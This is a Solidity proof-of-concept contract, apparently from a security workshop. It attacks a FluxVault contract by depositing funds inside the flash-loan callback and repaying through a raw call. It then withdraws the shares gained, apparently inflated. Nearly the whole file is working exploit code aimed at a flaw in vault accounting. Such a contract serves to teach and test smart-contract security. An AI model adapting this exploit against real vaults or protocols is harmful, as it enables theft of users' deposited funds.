// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {FluxVault, IFlashBorrower} from "./FluxVault.sol";

/// @notice Local workshop PoC, not for deployment to public networks.
contract FlashBorrower is IFlashBorrower {
    FluxVault public immutable vault;
    uint256 public depositDuringLoan;

    constructor(FluxVault _vault) {
        vault = _vault;
    }

    function attack(uint256 loan, uint256 depositAmount) external {
        depositDuringLoan = depositAmount;
        vault.flashLoan(loan);
        uint256 shares = vault.balanceOf(address(this));
        vault.withdraw(shares);
        depositDuringLoan = 0;
    }

    function onFlashLoan(uint256 amount, uint256 fee) external payable override {
        require(msg.sender == address(vault), "Only vault");
        require(msg.value == amount, "Incorrect loan");
        vault.deposit{value: depositDuringLoan}();
        (bool ok,) = payable(address(vault)).call{value: amount + fee}("");
        require(ok, "Repayment failed");
    }

    receive() external payable {}
}
